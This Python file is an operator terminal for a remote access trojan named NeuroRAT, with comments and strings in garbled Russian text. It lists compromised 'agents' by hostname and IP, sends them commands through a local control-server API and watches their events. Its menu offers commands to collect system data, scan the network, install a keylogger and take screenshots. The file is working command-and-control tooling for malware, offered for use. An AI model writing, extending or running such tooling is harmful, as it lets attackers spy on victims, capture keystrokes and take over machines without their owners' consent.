#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NeuroRAT Terminal - –¢–µ—Ä–º–∏–Ω–∞–ª—å–Ω—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è –ø—Ä—è–º–æ–≥–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è –∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∞–≥–µ–Ω—Ç–æ–≤
"""
import os
import sys
import json
import time
import requests
import threading
import platform
import subprocess
from datetime import datetime

# –¶–≤–µ—Ç–∞ –¥–ª—è —Ç–µ—Ä–º–∏–Ω–∞–ª–∞
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
RESET = "\033[0m"
BOLD = "\033[1m"

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
API_HOST = "localhost"
API_PORT = "5001"  # 5001 –≤–Ω–µ—à–Ω–∏–π, 5000 –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π
API_URL = f"http://{API_HOST}:{API_PORT}"

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
current_agent = None
log_thread = None
running = True
session_logs = []

def log(message, color=RESET):
    """–ó–∞–ø–∏—Å–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–æ–≥ —Å –≤—Ä–µ–º–µ–Ω–Ω–æ–π –º–µ—Ç–∫–æ–π"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    session_logs.append(log_entry)
    print(f"{color}{log_entry}{RESET}")

def clear_screen():
    """–û—á–∏—Å—Ç–∏—Ç—å —ç–∫—Ä–∞–Ω —Ç–µ—Ä–º–∏–Ω–∞–ª–∞"""
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def get_agents():
    """–ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –∞–≥–µ–Ω—Ç–æ–≤"""
    try:
        response = requests.get(f"{API_URL}/api/agents")
        if response.status_code == 200:
            return response.json()
        else:
            log(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–≥–µ–Ω—Ç–æ–≤: {response.status_code}", RED)
            return []
    except Exception as e:
        log(f"–ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∞–≥–µ–Ω—Ç–æ–≤: {e}", RED)
        return []

def get_agent_details(agent_id):
    """–ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∞–≥–µ–Ω—Ç–µ"""
    try:
        response = requests.get(f"{API_URL}/api/agent/{agent_id}")
        if response.status_code == 200:
            return response.json()
        else:
            log(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞–≥–µ–Ω—Ç–µ: {response.status_code}", RED)
            return {}
    except Exception as e:
        log(f"–ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞–≥–µ–Ω—Ç–µ: {e}", RED)
        return {}

def get_events():
    """–ü–æ–ª—É—á–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–±—ã—Ç–∏—è"""
    try:
        response = requests.get(f"{API_URL}/api/events")
        if response.status_code == 200:
            return response.json()
        else:
            log(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ–±—ã—Ç–∏–π: {response.status_code}", RED)
            return []
    except Exception as e:
        log(f"–ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–æ–±—ã—Ç–∏–π: {e}", RED)
        return []

def send_command(agent_id, command):
    """–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –∞–≥–µ–Ω—Ç—É"""
    try:
        response = requests.post(
            f"{API_URL}/api/agent/{agent_id}/chat",
            json={"message": command}
        )
        if response.status_code == 200:
            return response.json()
        else:
            log(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–º–∞–Ω–¥—ã: {response.status_code}", RED)
            return {"error": f"HTTP {response.status_code}", "response": "–û—à–∏–±–∫–∞ —Å–≤—è–∑–∏ —Å —Å–µ—Ä–≤–µ—Ä–æ–º"}
    except Exception as e:
        log(f"–ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–º–∞–Ω–¥—ã: {e}", RED)
        return {"error": str(e), "response": "–û—à–∏–±–∫–∞ —Å–≤—è–∑–∏ —Å —Å–µ—Ä–≤–µ—Ä–æ–º"}

def monitor_events():
    """–û—Ç–¥–µ–ª—å–Ω—ã–π –ø–æ—Ç–æ–∫ –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–æ–±—ã—Ç–∏–π"""
    global running
    last_event_count = 0
    
    while running:
        try:
            events = get_events()
            if len(events) > last_event_count:
                new_events = events[:len(events) - last_event_count]
                for event in reversed(new_events):
                    event_type = event.get("Event Type", "unknown")
                    agent = event.get("Agent", "system")
                    details = event.get("Details", "no details")
                    
                    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–≤–µ—Ç –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ —Å–æ–±—ã—Ç–∏—è
                    color = RESET
                    if "error" in event_type:
                        color = RED
                    elif "connection" in event_type:
                        color = GREEN
                    elif "command" in event_type:
                        color = BLUE
                    elif "data" in event_type:
                        color = MAGENTA
                    
                    log(f"üìã –°–æ–±—ã—Ç–∏–µ: {event_type} - –ê–≥–µ–Ω—Ç: {agent} - {details}", color)
                
                last_event_count = len(events)
        except Exception as e:
            log(f"–û—à–∏–±–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–æ–±—ã—Ç–∏–π: {e}", RED)
        
        time.sleep(5)

def execute_docker_command(command):
    """–í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ Docker"""
    try:
        full_command = f"docker exec -it neurorat-server {command}"
        process = subprocess.Popen(
            full_command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            log(f"–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã –≤ Docker: {stderr}", RED)
            return False, stderr
        
        return True, stdout
    except Exception as e:
        log(f"–ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã –≤ Docker: {e}", RED)
        return False, str(e)

def view_docker_logs():
    """–ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏"""
    log("–ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞. –ù–∞–∂–º–∏—Ç–µ Ctrl+C –¥–ª—è –≤—ã—Ö–æ–¥–∞.", YELLOW)
    try:
        subprocess.run("docker logs -f neurorat-server", shell=True)
    except KeyboardInterrupt:
        print("\n")
        log("–ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω.", YELLOW)

def print_header():
    """–í—ã–≤–µ—Å—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–æ–∫"""
    clear_screen()
    print(f"{BOLD}{MAGENTA}='='='='='='='='='='='='='='='='='='='='='='='={RESET}")
    print(f"{BOLD}{MAGENTA}     NeuroRAT –¢–µ—Ä–º–∏–Ω–∞–ª—å–Ω—ã–π –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å     {RESET}")
    print(f"{BOLD}{MAGENTA}='='='='='='='='='='='='='='='='='='='='='='='={RESET}\n")

def print_main_menu():
    """–í—ã–≤–µ—Å—Ç–∏ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é"""
    print(f"\n{BOLD}{YELLOW}–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:{RESET}")
    print(f"  {CYAN}agents{RESET}     - –ü–æ–∫–∞–∑–∞—Ç—å —Å–ø–∏—Å–æ–∫ –∞–≥–µ–Ω—Ç–æ–≤")
    print(f"  {CYAN}select N{RESET}   - –í—ã–±—Ä–∞—Ç—å –∞–≥–µ–Ω—Ç–∞ –ø–æ –Ω–æ–º–µ—Ä—É")
    print(f"  {CYAN}events{RESET}     - –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–±—ã—Ç–∏—è")
    print(f"  {CYAN}logs{RESET}       - –ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞")
    print(f"  {CYAN}monitor{RESET}    - –í–∫–ª—é—á–∏—Ç—å/–≤—ã–∫–ª—é—á–∏—Ç—å –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å–æ–±—ã—Ç–∏–π")
    print(f"  {CYAN}bash{RESET}       - –ó–∞–ø—É—Å—Ç–∏—Ç—å bash –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ")
    print(f"  {CYAN}python{RESET}     - –ó–∞–ø—É—Å—Ç–∏—Ç—å Python –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ")
    print(f"  {CYAN}clear{RESET}      - –û—á–∏—Å—Ç–∏—Ç—å —ç–∫—Ä–∞–Ω")
    print(f"  {CYAN}help{RESET}       - –ü–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ –º–µ–Ω—é")
    print(f"  {CYAN}exit{RESET}       - –í—ã–π—Ç–∏ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã")
    print(f"\n{BOLD}{YELLOW}–í —Ä–µ–∂–∏–º–µ –∞–≥–µ–Ω—Ç–∞ –¥–æ—Å—Ç—É–ø–Ω—ã –∫–æ–º–∞–Ω–¥—ã:{RESET}")
    print(f"  {CYAN}..{RESET}         - –í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")
    print(f"  {CYAN}STATUS{RESET}     - –ó–∞–ø—Ä–æ—Å–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∞–≥–µ–Ω—Ç–∞")
    print(f"  {CYAN}COLLECT{RESET}    - –°–æ–±—Ä–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ")
    print(f"  {CYAN}SCAN{RESET}       - –°–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —Å–µ—Ç—å")
    print(f"  {CYAN}KEYLOG{RESET}     - –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–µ–π–ª–æ–≥–≥–µ—Ä")
    print(f"  {CYAN}SCREENSHOT{RESET} - –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç")
    print(f"\n{BOLD}{YELLOW}='='='='='='='='='='='='='='='='='='='='='='='={RESET}")

def show_agent_prompt(agent_id):
    """–ü–æ–∫–∞–∑–∞—Ç—å –ø—Ä–æ–º–ø—Ç –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–º–∞–Ω–¥ –∞–≥–µ–Ω—Ç—É"""
    agent_details = get_agent_details(agent_id)
    os_type = agent_details.get("os", "Unknown")
    hostname = agent_details.get("hostname", "unknown")
    status = agent_details.get("status", "unknown")
    
    status_color = GREEN if status == "active" else RED
    prompt = f"{BOLD}{BLUE}[–ê–≥–µ–Ω—Ç:{RESET} {agent_id} | {os_type}@{hostname} | {status_color}{status}{RESET}{BOLD}{BLUE}]{RESET} > "
    return prompt

def display_agents():
    """–û—Ç–æ–±—Ä–∞–∑–∏—Ç—å —Å–ø–∏—Å–æ–∫ –∞–≥–µ–Ω—Ç–æ–≤"""
    agents = get_agents()
    if not agents:
        log("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–≥–µ–Ω—Ç–æ–≤ –∏–ª–∏ –æ—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º", RED)
        return
    
    print(f"\n{BOLD}{YELLOW}–î–æ—Å—Ç—É–ø–Ω—ã–µ –∞–≥–µ–Ω—Ç—ã:{RESET}")
    for i, agent_id in enumerate(agents, 1):
        agent_details = get_agent_details(agent_id)
        status = agent_details.get("status", "unknown")
        os_type = agent_details.get("os", "Unknown")
        hostname = agent_details.get("hostname", "unknown")
        ip = agent_details.get("ip_address", "unknown")
        
        status_color = GREEN if status == "active" else RED
        print(f"  {CYAN}{i}.{RESET} {agent_id} [{os_type}] - {hostname}@{ip} - {status_color}{status}{RESET}")

def display_events():
    """–û—Ç–æ–±—Ä–∞–∑–∏—Ç—å –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–±—ã—Ç–∏—è"""
    events = get_events()
    if not events:
        log("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–æ–±—ã—Ç–∏–π –∏–ª–∏ –æ—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º", RED)
        return
    
    print(f"\n{BOLD}{YELLOW}–ü–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–±—ã—Ç–∏—è:{RESET}")
    for i, event in enumerate(events[:10], 1):  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Ç–æ–ª—å–∫–æ 10 –ø–æ—Å–ª–µ–¥–Ω–∏—Ö —Å–æ–±—ã—Ç–∏–π
        event_time = event.get("Time", "unknown")
        event_type = event.get("Event Type", "unknown")
        agent = event.get("Agent", "system")
        details = event.get("Details", "no details")
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–≤–µ—Ç –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ —Å–æ–±—ã—Ç–∏—è
        color = RESET
        if "error" in event_type:
            color = RED
        elif "connection" in event_type:
            color = GREEN
        elif "command" in event_type:
            color = BLUE
        elif "data" in event_type:
            color = MAGENTA
        
        print(f"  {CYAN}{i}.{RESET} [{event_time}] {color}{event_type}{RESET} - –ê–≥–µ–Ω—Ç: {agent} - {details}")

def start_monitor_thread():
    """–ó–∞–ø—É—Å—Ç–∏—Ç—å –ø–æ—Ç–æ–∫ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–æ–±—ã—Ç–∏–π"""
    global log_thread, running
    
    if log_thread and log_thread.is_alive():
        log("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —É–∂–µ –∑–∞–ø—É—â–µ–Ω", YELLOW)
        return
    
    running = True
    log_thread = threading.Thread(target=monitor_events, daemon=True)
    log_thread.start()
    log("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å–æ–±—ã—Ç–∏–π –∑–∞–ø—É—â–µ–Ω", GREEN)

def stop_monitor_thread():
    """–û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–æ—Ç–æ–∫ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–æ–±—ã—Ç–∏–π"""
    global running
    
    if log_thread and log_thread.is_alive():
        running = False
        log_thread.join(timeout=1)
        log("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Å–æ–±—ã—Ç–∏–π –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω", YELLOW)
    else:
        log("–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –Ω–µ –±—ã–ª –∑–∞–ø—É—â–µ–Ω", YELLOW)

def agent_interaction_mode(agent_id):
    """–†–µ–∂–∏–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –∞–≥–µ–Ω—Ç–æ–º"""
    global current_agent
    
    current_agent = agent_id
    log(f"–ù–∞—á–∞–ª–æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –∞–≥–µ–Ω—Ç–æ–º {agent_id}", GREEN)
    
    while True:
        try:
            command = input(show_agent_prompt(agent_id))
            
            # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥
            if command.lower() == "..":
                break
            elif command.lower() == "exit":
                return "exit"
            elif command.lower() == "clear":
                clear_screen()
                continue
            
            # –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã –∞–≥–µ–Ω—Ç—É
            log(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥—ã –∞–≥–µ–Ω—Ç—É {agent_id}: {command}", BLUE)
            response = send_command(agent_id, command)
            
            if "error" in response:
                log(f"–û—à–∏–±–∫–∞: {response.get('error')}", RED)
            else:
                print(f"\n{MAGENTA}–û—Ç–≤–µ—Ç –∞–≥–µ–Ω—Ç–∞:{RESET}")
                print(f"{response.get('response', '–ù–µ—Ç –æ—Ç–≤–µ—Ç–∞')}\n")
        
        except KeyboardInterrupt:
            print("\n")
            log("–í–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ –ø—Ä–µ—Ä–≤–∞–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º", YELLOW)
            break
        except Exception as e:
            log(f"–û—à–∏–±–∫–∞ –≤ —Ä–µ–∂–∏–º–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è: {e}", RED)
    
    current_agent = None
    return None

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    global current_agent
    
    print_header()
    log("–ó–∞–ø—É—Å–∫ NeuroRAT –¢–µ—Ä–º–∏–Ω–∞–ª—å–Ω–æ–≥–æ –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞", GREEN)
    print_main_menu()
    
    try:
        while True:
            if current_agent:
                result = agent_interaction_mode(current_agent)
                if result == "exit":
                    break
                print_main_menu()
            
            command = input(f"\n{BOLD}{GREEN}NeuroRAT >{RESET} ")
            parts = command.split()
            
            # –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—Å–Ω–æ–≤–Ω—ã—Ö –∫–æ–º–∞–Ω–¥
            if command.lower() == "exit":
                break
            elif command.lower() == "clear":
                clear_screen()
            elif command.lower() == "help":
                print_main_menu()
            elif command.lower() == "agents":
                display_agents()
            elif command.lower() == "events":
                display_events()
            elif command.lower() == "logs":
                view_docker_logs()
            elif parts and parts[0].lower() == "select":
                if len(parts) < 2:
                    log("–ù–µ–æ–±—Ö–æ–¥–∏–º–æ —É–∫–∞–∑–∞—Ç—å –Ω–æ–º–µ—Ä –∞–≥–µ–Ω—Ç–∞", RED)
                    continue
                
                try:
                    agent_num = int(parts[1])
                    agents = get_agents()
                    
                    if 1 <= agent_num <= len(agents):
                        current_agent = agents[agent_num - 1]
                    else:
                        log(f"–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–π –Ω–æ–º–µ—Ä –∞–≥–µ–Ω—Ç–∞. –î–æ—Å—Ç—É–ø–Ω—ã: 1-{len(agents)}", RED)
                except ValueError:
                    log("–ù–æ–º–µ—Ä –∞–≥–µ–Ω—Ç–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º", RED)
            elif command.lower() == "monitor":
                if log_thread and log_thread.is_alive():
                    stop_monitor_thread()
                else:
                    start_monitor_thread()
            elif command.lower() == "bash":
                log("–ó–∞–ø—É—Å–∫ bash –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ. –í–≤–µ–¥–∏—Ç–µ 'exit' –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞.", YELLOW)
                subprocess.run("docker exec -it neurorat-server /bin/bash", shell=True)
            elif command.lower() == "python":
                log("–ó–∞–ø—É—Å–∫ Python –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ. –í–≤–µ–¥–∏—Ç–µ 'exit()' –¥–ª—è –≤–æ–∑–≤—Ä–∞—Ç–∞.", YELLOW)
                subprocess.run("docker exec -it neurorat-server python", shell=True)
            else:
                log(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞: {command}", RED)
    
    except KeyboardInterrupt:
        print("\n")
        log("–í—ã—Ö–æ–¥ –ø–æ –∑–∞–ø—Ä–æ—Å—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", YELLOW)
    except Exception as e:
        log(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}", RED)
    finally:
        stop_monitor_thread()
        log("–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã NeuroRAT –¢–µ—Ä–º–∏–Ω–∞–ª—å–Ω–æ–≥–æ –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞", YELLOW)

if __name__ == "__main__":
    main()
